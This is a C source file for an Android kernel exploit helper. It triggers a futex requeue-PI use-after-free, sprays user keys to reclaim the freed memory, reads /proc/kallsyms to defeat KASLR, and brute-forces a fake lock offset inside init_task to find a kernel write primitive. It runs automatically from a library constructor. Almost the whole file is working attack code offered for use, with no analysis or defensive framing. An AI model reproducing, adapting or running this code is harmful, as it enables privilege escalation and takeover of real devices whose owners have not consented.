// brute_lock.c - Brute force fake_lock offset to find working write primitive
// Compile: clang -target aarch64-linux-android21 -shared -fPIC -static-libgcc -Wl,--hash-style=gnu -o brute_lock.so brute_lock.c -lpthread

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <stdatomic.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl  
#define __NR_keyctl 219
#endif

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_UNLINK 9

static uint32_t f_wait = 0;
static uint32_t f_pi_target = 0;
static uint64_t kaslr_slide = 0;
static uint64_t init_task_runtime = 0;

static atomic_int owner_ready = 0;
static atomic_int waiter_ready = 0;
static atomic_int waiter_tid = 0;
static pthread_t owner_thread = 0;
static pthread_t waiter_thread = 0;
static atomic_int stop_threads = 0;

void *owner_fn(void *arg) {
    (void)arg;
    int ret = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] LOCK_PI ret=%d f_pi_target=%u tid=%u\n", ret, f_pi_target, gettid());
    atomic_store(&owner_ready, 1);
    while(!atomic_load(&stop_threads)) sleep(1);
    return NULL;
}

void *waiter_fn(void *arg) {
    (void)arg;
    atomic_store(&waiter_tid, gettid());
    atomic_store(&waiter_ready, 1);
    
    printf("[waiter] tid=%u calling WAIT_REQUEUE_PI f_wait=%u f_pi_target=%u\n", 
           gettid(), f_wait, f_pi_target);
    
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 60;
    
    int ret = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI ret=%d errno=%d\n", ret, errno);
    return NULL;
}

static inline uint64_t canon(uint64_t addr) {
    return addr | 0xffff000000000000ULL;
}

int run_single_attempt(uint64_t fake_lock_offset) {
    char payload[110];
    memset(payload, 0, sizeof(payload));
    
    uint64_t fake_task = init_task_runtime;
    uint64_t fake_lock = fake_task + fake_lock_offset;
    
    memcpy(payload + 30, &fake_task, 8);
    memcpy(payload + 38, &fake_lock, 8);
    *(int*)(payload + 46) = 1;
    
    // DRAIN 6500 keys
    int drain[6500];
    int drained = 0;
    for (int i = 0; i < 6500; i++) {
        drain[i] = syscall(__NR_add_key, "user", "d", payload, 110, KEY_SPEC_PROCESS_KEYRING);
        if (drain[i] > 0) drained++;
    }
    
    // Reset state
    f_wait = 0;
    f_pi_target = 0;
    owner_ready = 0;
    waiter_ready = 0;
    stop_threads = 0;
    
    // Start threads
    pthread_create(&owner_thread, NULL, owner_fn, NULL);
    while (!atomic_load(&owner_ready)) sched_yield();
    usleep(100000);
    
    pthread_create(&waiter_thread, NULL, waiter_fn, NULL);
    while (!atomic_load(&waiter_ready)) sched_yield();
    usleep(500000);  // Give waiter time to actually block
    
    // UAF - requeue waiter from f_wait to f_pi_target WITHOUT waking
    // nr_wake=0, nr_requeue=1: don't wake, just move to pi_target's waiters list
    // This frees the rt_mutex_waiter while it's still linked in the rbtree
    int ret = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 0, (void*)1, &f_pi_target, 0);
    
    if (ret == 1) {
        // Reclaim the freed slot
        int winner = syscall(__NR_add_key, "user", "w", payload, 110, KEY_SPEC_PROCESS_KEYRING);
        
        // Chain walk with TIMING detection
        struct timespec before, after, ts = {3, 0};
        clock_gettime(CLOCK_MONOTONIC, &before);
        long walk_ret = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
        clock_gettime(CLOCK_MONOTONIC, &after);
        
        uint64_t ms = (after.tv_sec - before.tv_sec) * 1000 + (after.tv_nsec - before.tv_nsec) / 1000000;
        
        printf("[TRY] offset=0x%lx ret=%ld errno=%d time=%lums %s\n",
               fake_lock_offset, walk_ret, errno, ms,
               ms < 2900 ? "<-- CHAIN WALKED DEEPER!" : "(owner=0, early exit)");
        
        if (winner > 0) syscall(__NR_keyctl, KEYCTL_UNLINK, winner, KEY_SPEC_PROCESS_KEYRING);
    } else {
        printf("[-] requeue failed ret=%d errno=%d\n", ret, errno);
    }
    
    // Signal threads to stop
    atomic_store(&stop_threads, 1);
    usleep(100000);
    
    // Cleanup keys
    for (int i = 0; i < 6500; i++) {
        if (drain[i] > 0) syscall(__NR_keyctl, KEYCTL_UNLINK, drain[i], KEY_SPEC_PROCESS_KEYRING);
    }
    
    return 1;
}

__attribute__((constructor))
void init(void) {
    printf("[brute_lock] Scanning for correct fake_lock offset\n\n");
    
    // Get slide
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[256];
        while (fgets(line, sizeof(line), ks)) {
            uint64_t addr; char type[4], name[128];
            if (sscanf(line, "%lx %s %s", &addr, type, name) == 3) {
                if (strcmp(name, "perf_event_init_task") == 0 && addr != 0) {
                    kaslr_slide = addr - 0xffffff80081f2f74ULL;
                    break;
                }
            }
        }
        fclose(ks);
    }
    
    init_task_runtime = 0xffffff800957b6c0ULL + kaslr_slide;
    printf("[*] slide = %lx\n", kaslr_slide);
    printf("[*] init_task = %lx\n\n", init_task_runtime);
    
    // Offsets to try (fake_lock = init_task + offset)
    // We want init_task + offset + 0x18 to land on a field containing init_task pointer
    // So offset = real_parent_offset - 0x18
    
    uint64_t offsets[] = {
        // Extended offset list with timing detection
        0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0, 0x2C8, 0x2D0, 0x2D8,
        0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300, 0x308, 0x310, 0x318,
        0x320, 0x328, 0x330, 0x338, 0x340, 0x348, 0x350, 0x358,
        0x360, 0x368, 0x370, 0x378, 0x380, 0x388, 0x390, 0x398,
        0x3A0, 0x3A8, 0x3B0, 0x3B8, 0x3C0, 0x3C8, 0x3D0, 0x3D8,
        0x580, 0x588, 0x590, 0x598, 0x5A0, 0x5A8, 0x5B0, 0x5B8, 0x5C0,
    };
    int num = sizeof(offsets) / sizeof(offsets[0]);
    
    for (int i = 0; i < num; i++) {
        printf("[TRY %2d/%d] fake_lock_offset = 0x%lx\n", i+1, num, offsets[i]);
        run_single_attempt(offsets[i]);
        
        // Small delay between attempts
        usleep(500000);
    }
    
    printf("\n[DONE] Brute force complete\n");
}
